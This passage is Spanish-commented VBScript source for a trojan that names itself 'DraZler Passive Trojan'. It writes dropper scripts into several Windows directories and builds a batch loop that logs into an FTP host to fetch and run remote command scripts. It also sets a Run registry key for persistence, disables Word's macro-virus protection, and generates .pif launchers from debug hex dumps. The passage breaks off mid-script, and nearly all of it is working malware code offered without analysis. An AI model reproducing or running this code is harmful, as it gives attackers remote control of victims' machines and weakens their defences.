DraZ.WriteLine("Ejecutar.Run " & Chr(34) & "C:\draz.bat" & Chr(34) & "," & Chr(34) & "0" & Chr(34))
DraZ.Close()

Set DraZInit = AccesoHD.CreatetextFile("C:\WINDOWS\dinit.vbs",1,false)
DraZInit.WriteLine("On Error Resume Next")
DraZInit.WriteLine("Set Ejecutar = CreateObject(" & Chr(34) & "WScript.Shell" & Chr(34) & ")")
DraZInit.WriteLine("Ejecutar.Run " & Chr(34) & "C:\WINDOWS\drazler.pif" & Chr(34) & "," & Chr(34) & "0" & Chr(34))
DraZInit.Close()

Set DrazSrcPif = AccesoHD.CreatetextFile("C:\draz.src",1,false)
DrazSrcPif.WriteLine("N c:\windows\drazler.pif")
DrazSrcPif.WriteLine("E 0100 00 78 44 52 41 5A 4C 45 52 20 20 20 20 20 20 20 ")
DrazSrcPif.WriteLine("E 0110 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 ")
DrazSrcPif.WriteLine("E 0120 80 02 00 00 43 3A 5C 57 49 4E 44 4F 57 53 5C 77 ")
DrazSrcPif.WriteLine("E 0130 73 63 72 69 70 74 2E 65 78 65 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 0140 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 0150 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 0160 00 00 00 10 00 43 3A 5C 00 49 4E 44 4F 57 53 00 ")
DrazSrcPif.WriteLine("E 0170 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 0180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 0190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 01A0 00 00 00 00 00 43 3A 5C 57 49 4E 44 4F 57 53 5C ")
DrazSrcPif.WriteLine("E 01B0 64 72 61 7A 6C 65 72 2E 76 62 73 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 01C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 01D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 01E0 00 00 00 00 00 00 01 00 FF 19 50 00 00 07 00 00 ")
DrazSrcPif.WriteLine("E 01F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 0200 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 0210 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 0220 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 0230 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 0240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 0250 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 0260 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 0270 00 4D 49 43 52 4F 53 4F 46 54 20 50 49 46 45 58 ")
DrazSrcPif.WriteLine("E 0280 00 87 01 00 00 71 01 57 49 4E 44 4F 57 53 20 33 ")
DrazSrcPif.WriteLine("E 0290 38 36 20 33 2E 30 00 05 02 9D 01 68 00 80 02 00 ")
DrazSrcPif.WriteLine("E 02A0 00 64 00 32 00 FF FF 00 00 FF FF 00 00 E2 1F 18 ")
DrazSrcPif.WriteLine("E 02B0 00 1F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 02C0 00 00 00 00 00 43 3A 5C 57 49 4E 44 4F 57 53 5C ")
DrazSrcPif.WriteLine("E 02D0 64 72 61 7A 6C 65 72 2E 76 62 73 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 02E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 02F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 0300 00 00 00 00 00 57 49 4E 44 4F 57 53 20 56 4D 4D ")
DrazSrcPif.WriteLine("E 0310 20 34 2E 30 00 FF FF 1B 02 AC 01 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 0320 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 0330 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 0340 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 0350 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 0360 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 0370 00 00 00 63 3A 5C 77 69 6E 64 6F 77 73 5C 73 79 ")
DrazSrcPif.WriteLine("E 0380 73 74 65 6D 5C 73 68 65 6C 6C 33 32 2E 64 6C 6C ")
DrazSrcPif.WriteLine("E 0390 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 03A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 03B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 03C0 00 00 00 15 00 12 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 03D0 00 32 00 01 00 00 00 00 00 00 00 00 00 00 00 E0 ")
DrazSrcPif.WriteLine("E 03E0 0F 00 00 05 00 19 00 03 00 C8 00 E8 03 02 00 0A ")
DrazSrcPif.WriteLine("E 03F0 00 01 00 00 00 00 00 00 00 1C 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 0400 00 00 00 00 00 54 65 72 6D 69 6E 61 6C 00 00 00 ")
DrazSrcPif.WriteLine("E 0410 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 0420 00 00 00 00 00 4C 75 63 69 64 61 20 43 6F 6E 73 ")
DrazSrcPif.WriteLine("E 0430 6F 6C 65 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 0440 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 0450 00 00 00 00 00 00 00 16 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 0460 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 0470 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 0480 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 0490 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 04A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 04B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif.WriteLine("E 04C0 00 00 00 00 00 01 00 ")
DrazSrcPif.WriteLine("RCX")
DrazSrcPif.WriteLine("400")
DrazSrcPif.WriteLine("W")
DrazSrcPif.WriteLine("Q")
DrazSrcPif.Close()


Set DraZ95 = AccesoHD.CreateTextFile("C:\WIN95\drazler.vbs",1,false)
DraZ95.WriteLine("On Error Resume Next")
DraZ95.WriteLine("Set Ejecutar = CreateObject(" & Chr(34) & "WScript.Shell" & Chr(34) & ")")
DraZ95.WriteLine("Set AccesoHD = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")")
DraZ95.WriteLine("Set Ftp = AccesoHD.CreateTextFile(" & Chr(34) & "C:\draz.bat" & Chr(34) & ",1,false)")
DraZ95.WriteLine("Ftp.WriteLine(" & Chr(34) & "@echo off" & Chr(34) & ")")
DraZ95.WriteLine("Ftp.WriteLine(" & Chr(34) & ":reiniciar" & Chr(34) & ")")
DraZ95.WriteLine("Ftp.WriteLine(" & Chr(34) & "echo user milogin miclave > C:\rank.sys" & Chr(34) & ")")
DraZ95.WriteLine("Ftp.WriteLine(" & Chr(34) & "echo get done C:\done >> C:\rank.sys" & Chr(34) & ")")
DraZ95.WriteLine("Ftp.WriteLine(" & Chr(34) & "echo get ord.vbs C:\ord.vbs >> C:\rank.sys" & Chr(34) & ")")
DraZ95.WriteLine("Ftp.WriteLine(" & Chr(34) & "echo delete ord.vbs >> C:\rank.sys" & Chr(34) & ")")
DraZ95.WriteLine("Ftp.WriteLine(" & Chr(34) & "echo bye >> C:\rank.sys" & Chr(34) & ")")
DraZ95.WriteLine("Ftp.WriteLine(" & Chr(34) & ":repetir" & Chr(34) & ")")
DraZ95.WriteLine("Ftp.WriteLine(" & Chr(34) & "@if not exist C:\rank.sys goto reiniciar" & Chr(34) & ")")
DraZ95.WriteLine("Ftp.WriteLine(" & Chr(34) & "ftp -n -v -s:C:\rank.sys mi.ftp.com" & Chr(34) & ")")
DraZ95.WriteLine("Ftp.WriteLine(" & Chr(34) & "@if exist C:\done goto ejecutar" & Chr(34) & ")")
DraZ95.WriteLine("Ftp.WriteLine(" & Chr(34) & "goto repetir" & Chr(34) & ")")
DraZ95.WriteLine("Ftp.WriteLine(" & Chr(34) & ":ejecutar" & Chr(34) & ")")
DraZ95.WriteLine("Ftp.WriteLine(" & Chr(34) & "@if exist C:\ord.vbs wscript C:\ord.vbs" & Chr(34) & ")")
DraZ95.WriteLine("Ftp.WriteLine(" & Chr(34) & "del C:\done" & Chr(34) & ")")
DraZ95.WriteLine("Ftp.WriteLine(" & Chr(34) & "del C:\rank.sys" & Chr(34) & ")")
DraZ95.WriteLine("Ftp.Close()")
DraZ95.WriteLine("Ejecutar.RegWrite " & Chr(34) & "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\DraZler" & Chr(34) & ", " & Chr(34) & "C:\WIN95\wscript.exe C:\WIN95\dinit.vbs" & Chr(34))
DraZ95.WriteLine("Ejecutar.RegWrite " & Chr(34) & "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options\EnableMacroVirusProtection" & Chr(34) & " , " & Chr(34) & "0" & Chr(34))
DraZ95.WriteLine("Flecha = Ejecutar.RegRead(" & Chr(34) & "HKEY_CURRENT_USER\Control Panel\Cursors\Arrow" & Chr(34) & ")")
DraZ95.WriteLine("Ejecutar.RegWrite " & Chr(34) & "HKEY_CURRENT_USER\Control Panel\Cursors\AppStarting" & Chr(34) & ",Flecha")
DraZ95.WriteLine("Ejecutar.RegWrite " & Chr(34) & "HKEY_LOCAL_MACHINE\Software\DraZler\" & Chr(34) & "," & Chr(34) & "An InfoBioGenetic Industries Production." & Chr(34))
DraZ95.WriteLine("Ejecutar.RegWrite " & Chr(34) & "HKEY_LOCAL_MACHINE\Software\DraZler\NaMe" & Chr(34) & "," & Chr(34) & "DraZler Passive Trojan." & Chr(34))
DraZ95.WriteLine("Ejecutar.Run " & Chr(34) & "C:\draz.bat" & Chr(34) & "," & Chr(34) & "0" & Chr(34))
DraZ95.Close()

Set DraZInit95 = AccesoHD.CreatetextFile("C:\WIN95\dinit.vbs",1,false)
DraZInit95.WriteLine("On Error Resume Next")
DraZInit95.WriteLine("Set Ejecutar = CreateObject(" & Chr(34) & "WScript.Shell" & Chr(34) & ")")
DraZInit95.WriteLine("Ejecutar.Run " & Chr(34) & "C:\WIN95\drazler.pif" & Chr(34) & "," & Chr(34) & "0" & Chr(34))
DraZInit95.Close()


Set DrazSrcPif95 = AccesoHD.CreatetextFile("C:\draz95.src",1,false)
DrazSrcPif95.WriteLine("N c:\win95\drazler.pif")
DrazSrcPif95.WriteLine("E 0100 00 78 44 52 41 5A 4C 45 52 20 20 20 20 20 20 20 ")
DrazSrcPif95.WriteLine("E 0110 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 ")
DrazSrcPif95.WriteLine("E 0120 80 02 00 00 43 3A 5C 57 49 4E 39 35 5C 77 73 63 ")
DrazSrcPif95.WriteLine("E 0130 72 69 70 74 2E 65 78 65 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 0140 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 0150 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 0160 00 00 00 10 00 43 3A 5C 00 49 4E 39 35 00 00 00 ")
DrazSrcPif95.WriteLine("E 0170 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 0180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 0190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 01A0 00 00 00 00 00 43 3A 5C 57 49 4E 39 35 5C 64 72 ")
DrazSrcPif95.WriteLine("E 01B0 61 7A 6C 65 72 2E 76 62 73 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 01C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 01D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 01E0 00 00 00 00 00 00 01 00 FF 19 50 00 00 07 00 00 ")
DrazSrcPif95.WriteLine("E 01F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 0200 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 0210 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 0220 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 0230 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 0240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 0250 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 0260 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 0270 00 4D 49 43 52 4F 53 4F 46 54 20 50 49 46 45 58 ")
DrazSrcPif95.WriteLine("E 0280 00 87 01 00 00 71 01 57 49 4E 44 4F 57 53 20 33 ")
DrazSrcPif95.WriteLine("E 0290 38 36 20 33 2E 30 00 05 02 9D 01 68 00 80 02 00 ")
DrazSrcPif95.WriteLine("E 02A0 00 64 00 32 00 FF FF 00 00 FF FF 00 00 E2 1F 18 ")
DrazSrcPif95.WriteLine("E 02B0 00 1F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 02C0 00 00 00 00 00 43 3A 5C 57 49 4E 39 35 5C 64 72 ")
DrazSrcPif95.WriteLine("E 02D0 61 7A 6C 65 72 2E 76 62 73 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 02E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 02F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 0300 00 00 00 00 00 57 49 4E 44 4F 57 53 20 56 4D 4D ")
DrazSrcPif95.WriteLine("E 0310 20 34 2E 30 00 FF FF 1B 02 AC 01 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 0320 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 0330 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 0340 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 0350 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 0360 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 0370 00 00 00 63 3A 5C 77 69 6E 39 35 5C 73 79 73 74 ")
DrazSrcPif95.WriteLine("E 0380 65 6D 5C 73 68 65 6C 6C 33 32 2E 64 6C 6C 00 00 ")
DrazSrcPif95.WriteLine("E 0390 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 03A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 03B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 03C0 00 00 00 15 00 12 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 03D0 00 32 00 01 00 00 00 00 00 00 00 00 00 00 00 E0 ")
DrazSrcPif95.WriteLine("E 03E0 0F 00 00 05 00 19 00 03 00 C8 00 E8 03 02 00 0A ")
DrazSrcPif95.WriteLine("E 03F0 00 01 00 00 00 00 00 00 00 1C 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 0400 00 00 00 00 00 54 65 72 6D 69 6E 61 6C 00 00 00 ")
DrazSrcPif95.WriteLine("E 0410 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 0420 00 00 00 00 00 4C 75 63 69 64 61 20 43 6F 6E 73 ")
DrazSrcPif95.WriteLine("E 0430 6F 6C 65 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 0440 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 0450 00 00 00 00 00 00 00 16 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 0460 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 0470 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 0480 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 0490 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 04A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 04B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif95.WriteLine("E 04C0 00 00 00 00 00 01 00 ")
DrazSrcPif95.WriteLine("RCX")
DrazSrcPif95.WriteLine("400")
DrazSrcPif95.WriteLine("W")
DrazSrcPif95.WriteLine("Q")
DrazSrcPif95.Close()

Set DraZ98 = AccesoHD.CreateTextFile("C:\WIN98\drazler.vbs",1,false)
DraZ98.WriteLine("On Error Resume Next")
DraZ98.WriteLine("Set Ejecutar = CreateObject(" & Chr(34) & "WScript.Shell" & Chr(34) & ")")
DraZ98.WriteLine("Set AccesoHD = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")")
DraZ98.WriteLine("Set Ftp = AccesoHD.CreateTextFile(" & Chr(34) & "C:\draz.bat" & Chr(34) & ",1,false)")
DraZ98.WriteLine("Ftp.WriteLine(" & Chr(34) & "@echo off" & Chr(34) & ")")
DraZ98.WriteLine("Ftp.WriteLine(" & Chr(34) & ":reiniciar" & Chr(34) & ")")
DraZ98.WriteLine("Ftp.WriteLine(" & Chr(34) & "echo user milogin miclave > C:\rank.sys" & Chr(34) & ")")
DraZ98.WriteLine("Ftp.WriteLine(" & Chr(34) & "echo get done C:\done >> C:\rank.sys" & Chr(34) & ")")
DraZ98.WriteLine("Ftp.WriteLine(" & Chr(34) & "echo get ord.vbs C:\ord.vbs >> C:\rank.sys" & Chr(34) & ")")
DraZ98.WriteLine("Ftp.WriteLine(" & Chr(34) & "echo delete ord.vbs >> C:\rank.sys" & Chr(34) & ")")
DraZ98.WriteLine("Ftp.WriteLine(" & Chr(34) & "echo bye >> C:\rank.sys" & Chr(34) & ")")
DraZ98.WriteLine("Ftp.WriteLine(" & Chr(34) & ":repetir" & Chr(34) & ")")
DraZ98.WriteLine("Ftp.WriteLine(" & Chr(34) & "@if not exist C:\rank.sys goto reiniciar" & Chr(34) & ")")
DraZ98.WriteLine("Ftp.WriteLine(" & Chr(34) & "ftp -n -v -s:C:\rank.sys mi.ftp.com" & Chr(34) & ")")
DraZ98.WriteLine("Ftp.WriteLine(" & Chr(34) & "@if exist C:\done goto ejecutar" & Chr(34) & ")")
DraZ98.WriteLine("Ftp.WriteLine(" & Chr(34) & "goto repetir" & Chr(34) & ")")
DraZ98.WriteLine("Ftp.WriteLine(" & Chr(34) & ":ejecutar" & Chr(34) & ")")
DraZ98.WriteLine("Ftp.WriteLine(" & Chr(34) & "@if exist C:\ord.vbs wscript C:\ord.vbs" & Chr(34) & ")")
DraZ98.WriteLine("Ftp.WriteLine(" & Chr(34) & "del C:\done" & Chr(34) & ")")
DraZ98.WriteLine("Ftp.WriteLine(" & Chr(34) & "del C:\rank.sys" & Chr(34) & ")")
DraZ98.WriteLine("Ftp.Close()")
DraZ98.WriteLine("Ejecutar.RegWrite " & Chr(34) & "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\DraZler" & Chr(34) & ", " & Chr(34) & "C:\WIN98\wscript.exe C:\WIN98\dinit.vbs" & Chr(34))
DraZ98.WriteLine("Ejecutar.RegWrite " & Chr(34) & "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options\EnableMacroVirusProtection" & Chr(34) & " , " & Chr(34) & "0" & Chr(34))
DraZ98.WriteLine("Flecha = Ejecutar.RegRead(" & Chr(34) & "HKEY_CURRENT_USER\Control Panel\Cursors\Arrow" & Chr(34) & ")")
DraZ98.WriteLine("Ejecutar.RegWrite " & Chr(34) & "HKEY_CURRENT_USER\Control Panel\Cursors\AppStarting" & Chr(34) & ",Flecha")
DraZ98.WriteLine("Ejecutar.RegWrite " & Chr(34) & "HKEY_LOCAL_MACHINE\Software\DraZler\" & Chr(34) & "," & Chr(34) & "An InfoBioGenetic Industries Production." & Chr(34))
DraZ98.WriteLine("Ejecutar.RegWrite " & Chr(34) & "HKEY_LOCAL_MACHINE\Software\DraZler\NaMe" & Chr(34) & "," & Chr(34) & "DraZler Passive Trojan." & Chr(34))
DraZ98.WriteLine("Ejecutar.Run " & Chr(34) & "C:\draz.bat" & Chr(34) & "," & Chr(34) & "0" & Chr(34))
DraZ98.Close()


Set DraZInit98 = AccesoHD.CreatetextFile("C:\WIN98\dinit.vbs",1,false)
DraZInit98.WriteLine("On Error Resume Next")
DraZInit98.WriteLine("Set Ejecutar = CreateObject(" & Chr(34) & "WScript.Shell" & Chr(34) & ")")
DraZInit98.WriteLine("Ejecutar.Run " & Chr(34) & "C:\WIN98\drazler.pif" & Chr(34) & "," & Chr(34) & "0" & Chr(34))
DraZInit98.Close()

Set DrazSrcPif98 = AccesoHD.CreatetextFile("C:\draz98.src",1,false)
DrazSrcPif98.WriteLine("N c:\win98\drazler.pif")
DrazSrcPif98.WriteLine("E 0100 00 78 44 52 41 5A 4C 45 52 20 20 20 20 20 20 20 ")
DrazSrcPif98.WriteLine("E 0110 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 ")
DrazSrcPif98.WriteLine("E 0120 80 02 00 00 43 3A 5C 57 49 4E 39 38 5C 77 73 63 ")
DrazSrcPif98.WriteLine("E 0130 72 69 70 74 2E 65 78 65 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 0140 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 0150 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 0160 00 00 00 10 00 43 3A 5C 00 49 4E 39 38 00 00 00 ")
DrazSrcPif98.WriteLine("E 0170 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 0180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 0190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 01A0 00 00 00 00 00 43 3A 5C 57 49 4E 39 38 5C 64 72 ")
DrazSrcPif98.WriteLine("E 01B0 61 7A 6C 65 72 2E 76 62 73 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 01C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 01D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 01E0 00 00 00 00 00 00 01 00 FF 19 50 00 00 07 00 00 ")
DrazSrcPif98.WriteLine("E 01F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 0200 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 0210 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 0220 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 0230 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 0240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 0250 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 0260 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 0270 00 4D 49 43 52 4F 53 4F 46 54 20 50 49 46 45 58 ")
DrazSrcPif98.WriteLine("E 0280 00 87 01 00 00 71 01 57 49 4E 44 4F 57 53 20 33 ")
DrazSrcPif98.WriteLine("E 0290 38 36 20 33 2E 30 00 05 02 9D 01 68 00 80 02 00 ")
DrazSrcPif98.WriteLine("E 02A0 00 64 00 32 00 FF FF 00 00 FF FF 00 00 E2 1F 18 ")
DrazSrcPif98.WriteLine("E 02B0 00 1F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 02C0 00 00 00 00 00 43 3A 5C 57 49 4E 39 38 5C 64 72 ")
DrazSrcPif98.WriteLine("E 02D0 61 7A 6C 65 72 2E 76 62 73 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 02E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 02F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 0300 00 00 00 00 00 57 49 4E 44 4F 57 53 20 56 4D 4D ")
DrazSrcPif98.WriteLine("E 0310 20 34 2E 30 00 FF FF 1B 02 AC 01 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 0320 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 0330 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 0340 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 0350 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 0360 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 0370 00 00 00 63 3A 5C 77 69 6E 39 38 5C 73 79 73 74 ")
DrazSrcPif98.WriteLine("E 0380 65 6D 5C 73 68 65 6C 6C 33 32 2E 64 6C 6C 00 00 ")
DrazSrcPif98.WriteLine("E 0390 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 03A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 03B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 03C0 00 00 00 15 00 12 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 03D0 00 32 00 01 00 00 00 00 00 00 00 00 00 00 00 E0 ")
DrazSrcPif98.WriteLine("E 03E0 0F 00 00 05 00 19 00 03 00 C8 00 E8 03 02 00 0A ")
DrazSrcPif98.WriteLine("E 03F0 00 01 00 00 00 00 00 00 00 1C 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 0400 00 00 00 00 00 54 65 72 6D 69 6E 61 6C 00 00 00 ")
DrazSrcPif98.WriteLine("E 0410 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 0420 00 00 00 00 00 4C 75 63 69 64 61 20 43 6F 6E 73 ")
DrazSrcPif98.WriteLine("E 0430 6F 6C 65 00 00 00 00 00 00 00 00 00 00 00 00 00 ")
DrazSrcPif98.WriteLine("E 0440 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 ")
